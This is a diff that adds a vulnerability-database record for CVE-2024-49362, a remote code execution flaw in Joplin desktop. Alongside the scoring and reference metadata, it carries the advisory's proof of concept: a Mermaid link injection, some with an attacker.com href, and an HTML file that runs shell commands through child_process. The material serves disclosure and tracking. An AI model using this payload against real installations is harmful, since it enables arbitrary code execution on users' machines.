@@ -1,0 +1,367 @@
+vulnerability_id: VCID-getz-e13b-r3d5
+aliases:
+  - CVE-2024-49362
+  - GHSA-hff8-hjwv-j9q7
+summary: |
+  Remote Code Execution on click of <a> Link in markdown preview
+  ### Summary
+
+  There is a vulnerability in `Joplin-desktop` that leads to remote code execution (RCE) when a user clicks on an `<a>` link within untrusted notes. The issue arises due to insufficient sanitization of `<a>` tag attributes introduced by the `Mermaid`. This vulnerability allows the execution of untrusted HTML content within the Electron window, which has full access to Node.js APIs, enabling arbitrary shell command execution.
+
+  ### Details
+
+  In the markdown preview iframe, `Joplin` only opens `<a>` links internally within the same Electron window if they contain the `data-from-md` attribute. While Joplin successfully sanitizes the `data-from-md` attribute in user-embedded `<a>` links from the `.md` file to prevent the execution of untrusted HTML content, it fails to sanitize the `data-from-md` attributes of `<a>` tags introduced by `Mermaid` (e.g., the code snippet shown below). Since `Mermaid` allows the rendering of certain scriptless HTML elements, an attacker can embed `<a> `tags with `data-from-md` attributes, which will then be opened internally in the same Electron window.
+
+  Additionally, `Joplin` opens the window with `nodeIntegration` set to `true` and `contextIsolation` set to `false`, resulting in any scripts running in the opened window having full access to Node.js APIs. Furthermore, the markdown preview iframe shares the same origin (i.e.,local file system) as its parent and lacks the `sandbox` attribute, allowing scripts running in the iframe to call Node.js APIs through `window.parent`. As a result, an attacker can execute arbitrary code using Node.js APIs by exploiting HTML files stored on the local file system, which share the same origin as the parent.
+
+
+  **Relevant code references:**
+
+  + Payload to inject `<a>` with `data-from-md` attribute:
+
+  ````markdown
+  ```mermaid
+  flowchart TD
+      A[<a href="https://attacker.com" data-from-md>hello</a>]
+  ```
+  ````
+
+  + Handling link navigation in the markdown preview iframe
+
+  https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116
+
+  + Window configuration of `Joplin` window
+
+  https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155
+
+  ### PoC
+
+  Considering the user has downloaded the following shared files from the internet (Note: the threat model aligns with existing published security issues: [GHSA-2h88-m32f-qh5m](https://github.com/laurent22/joplin/security/advisories/GHSA-2h88-m32f-qh5m) and [GHSA-g8qx-5vcm-3x59](https://github.com/laurent22/joplin/security/advisories/GHSA-g8qx-5vcm-3x59), where the malicious HTML file is available locally):
+
+  + `poc.md`
+  ````markdown
+  ```mermaid
+  flowchart TD
+      A[<a href="/../../../../../../../../../../../../../../../path/to/poc2.html" data-from-md>hello</a>]
+  ```
+  ````
+
+  + `poc2.html`
+  ```
+  <html>
+    <body>
+      <script>
+        if (typeof window.parent.require !== 'undefined') {
+          const { exec } = window.parent.require('child_process');
+          exec('ls -al', (err, stdout, stderr) => {
+            if (err) {
+              document.body.innerText = `Error: ${err.message}`;
+              return;
+            }
+            if (stderr) {
+              document.body.innerText = `Stderr: ${stderr}`;
+              return;
+            }
+            document.body.innerText = stdout;
+          });
+        } else {
+          document.body.innerText = 'Require is not available in this environment.';
+        }
+      </script>
+    </body>
+  </html>
+  ```
+
+  Then, open the `poc.md` with `Joplin` and click on the `hello` link. The code embedded in the `poc2.html` will be executed.
+
+  ![result](https://github.com/user-attachments/assets/e85fbad8-a348-49cd-af51-4fc302dd6a8f)
+
+  ### Impact
+
+  This vulnerability can lead to Remote Code Execution (RCE) when users open and interact with untrusted notes, while malicious HTML files are available locally.
+severities:
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10531'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10618'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10551'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10446'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10542'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10553'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10399'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10606'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00038'
+    scoring_system: epss
+    scoring_elements: '0.10625'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10843'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10939'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10859'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10875'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10932'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.11287'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10364'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10184'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10278'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10302'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10366'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10377'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10429'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10484'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10788'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00048'
+    scoring_system: epss
+    scoring_elements: '0.14741'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00048'
+    scoring_system: epss
+    scoring_elements: '0.14765'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00048'
+    scoring_system: epss
+    scoring_elements: '0.14778'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00048'
+    scoring_system: epss
+    scoring_elements: '0.14775'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00048'
+    scoring_system: epss
+    scoring_elements: '0.14752'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36388'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36349'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36312'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36326'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36354'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36381'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36384'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.3627'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36231'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36355'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36369'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00179'
+    scoring_system: epss
+    scoring_elements: '0.36367'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00199'
+    scoring_system: epss
+    scoring_elements: '0.39129'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00199'
+    scoring_system: epss
+    scoring_elements: '0.39097'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: '0.00298'
+    scoring_system: epss
+    scoring_elements: '0.36799'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-hff8-hjwv-j9q7
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/laurent22/joplin
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/laurent22/joplin
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-11-14T21:38:47Z/
+    published_at: None
+    url: https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49362
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49362
+weaknesses:
+  - CWE-94
+  - CWE-937
+  - CWE-1035
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-49362
+    reference_type:
+    reference_id:
+  - url: https://github.com/laurent22/joplin
+    reference_type:
+    reference_id:
+  - url: https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-49362
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-hff8-hjwv-j9q7
+    reference_type:
+    reference_id: GHSA-hff8-hjwv-j9q7
